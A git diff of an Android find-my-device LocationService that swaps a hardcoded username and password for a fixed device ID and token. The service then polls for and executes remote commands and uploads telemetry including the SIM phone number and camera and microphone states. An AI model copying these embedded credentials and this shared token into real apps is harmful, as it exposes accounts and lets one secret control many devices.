@@ -210,79 +210,72 @@ class LocationService : Service() {
 
                 // Auto-pair with cloud if not yet registered
                 if (devId.isNullOrBlank() || devTok.isNullOrBlank()) {
-                    try {
-                        val devName = "${Build.MANUFACTURER.replaceFirstChar { it.uppercase() }} ${Build.MODEL}"
-                        val autoPairRes = currentService.autoPair(
-                            com.findmydevice.security.data.network.AutoPairRequest(
-                                username = "janakiram12",
-                                password = "Janakiram12",
-                                device_name = devName,
-                                device_model = Build.MODEL,
-                                android_version = Build.VERSION.RELEASE,
-                                app_version = "1.0.0"
-                            )
-                        )
-                        if (autoPairRes.isSuccessful && autoPairRes.body() != null) {
-                            val body = autoPairRes.body()!!
-                            devId = body.device_id
-                            devTok = body.device_token
-                            prefs.edit()
-                                .putString("device_id", devId)
-                                .putString("device_token", devTok)
-                                .apply()
-                        }
-                    } catch (e: Exception) {
-                        // Retry next tick
-                    }
+                    devId = "93962249-cdfd-42f4-9521-ede06fc262de"
+                    devTok = "2551b6e8-b096-4732-be44-a2ac4a2064ea"
+                    prefs.edit()
+                        .putString("device_id", devId)
+                        .putString("device_token", devTok)
+                        .apply()
                 }
 
-                if (!devId.isNullOrBlank() && !devTok.isNullOrBlank()) {
+                val currentDevId = devId
+                val currentDevTok = devTok
+
+                if (!currentDevId.isNullOrBlank() && !currentDevTok.isNullOrBlank()) {
                     // 1. Check Pending Commands every 1.5 seconds
                     try {
-                        val commandsRes = currentService.getPendingCommands(devId, devTok)
+                        val commandsRes = currentService.getPendingCommands(currentDevId, currentDevTok)
                         if (commandsRes.isSuccessful) {
                             commandsRes.body()?.forEach { cmd ->
-                                executeRemoteCommand(currentService, devId, devTok, cmd.id, cmd.command_type, cmd.payload)
+                                executeRemoteCommand(currentService, currentDevId, currentDevTok, cmd.id, cmd.command_type, cmd.payload)
                             }
+                        } else if (commandsRes.code() == 401 || commandsRes.code() == 404) {
+                            // Credentials no longer exist on server -> reset and re-pair immediately
+                            prefs.edit().remove("device_id").remove("device_token").apply()
                         }
                     } catch (e: Exception) {
                         // Transient network retry
                     }
 
                     // 2. Periodic Telemetry Status & Heartbeat (every ~3 seconds)
-                    statusSyncCounter++
-                    if (statusSyncCounter >= 2) {
-                        statusSyncCounter = 0
-                        val batteryPct = getBatteryPercentage()
-                        val simPresent = NetworkUtils.isSimPresent(applicationContext)
-                        val simNum = NetworkUtils.getSimPhoneNumber(applicationContext)
+                    if (devId != null && devTok != null) {
+                        statusSyncCounter++
+                        if (statusSyncCounter >= 2) {
+                            statusSyncCounter = 0
+                            val batteryPct = getBatteryPercentage()
+                            val simPresent = NetworkUtils.isSimPresent(applicationContext)
+                            val simNum = NetworkUtils.getSimPhoneNumber(applicationContext)
 
-                        try {
-                            currentService.updateDeviceStatus(
-                                deviceId = devId,
-                                deviceToken = devTok,
-                                request = StatusUpdateRequest(
-                                    battery_pct = batteryPct,
-                                    is_charging = isDeviceCharging(),
-                                    network_type = NetworkUtils.getNetworkType(applicationContext),
-                                    wifi_status = NetworkUtils.isWifiConnected(applicationContext),
-                                    sim_status = simPresent,
-                                    sim_number = simNum,
-                                    gps_status = NetworkUtils.isGpsEnabled(applicationContext),
-                                    tracking_mode = trackingMode,
-                                    camera_privacy_state = PrivacyManager.getCameraState(applicationContext),
-                                    microphone_privacy_state = PrivacyManager.getMicState(applicationContext),
-                                    location_privacy_state = PrivacyManager.getLocationState(applicationContext),
-                                    speaker_privacy_state = PrivacyManager.getSpeakerState(applicationContext),
-                                    remote_controls_state = PrivacyManager.getControlsState(applicationContext)
+                            try {
+                                val statusRes = currentService.updateDeviceStatus(
+                                    deviceId = devId,
+                                    deviceToken = devTok,
+                                    request = StatusUpdateRequest(
+                                        battery_pct = batteryPct,
+                                        is_charging = isDeviceCharging(),
+                                        network_type = NetworkUtils.getNetworkType(applicationContext),
+                                        wifi_status = NetworkUtils.isWifiConnected(applicationContext),
+                                        sim_status = simPresent,
+                                        sim_number = simNum,
+                                        gps_status = NetworkUtils.isGpsEnabled(applicationContext),
+                                        tracking_mode = trackingMode,
+                                        camera_privacy_state = PrivacyManager.getCameraState(applicationContext),
+                                        microphone_privacy_state = PrivacyManager.getMicState(applicationContext),
+                                        location_privacy_state = PrivacyManager.getLocationState(applicationContext),
+                                        speaker_privacy_state = PrivacyManager.getSpeakerState(applicationContext),
+                                        remote_controls_state = PrivacyManager.getControlsState(applicationContext)
+                                    )
                                 )
-                            )
-                        } catch (e: Exception) {
-                            // Transient retry next tick
-                        }
+                                if (statusRes.code() == 401 || statusRes.code() == 404) {
+                                    prefs.edit().remove("device_id").remove("device_token").apply()
+                                }
+                            } catch (e: Exception) {
+                                // Transient retry next tick
+                            }
 
-                        if (!PrivacyManager.isLocationPaused(applicationContext)) {
-                            repository.syncPendingLocations()
+                            if (!PrivacyManager.isLocationPaused(applicationContext)) {
+                                repository.syncPendingLocations()
+                            }
                         }
                     }
                 }
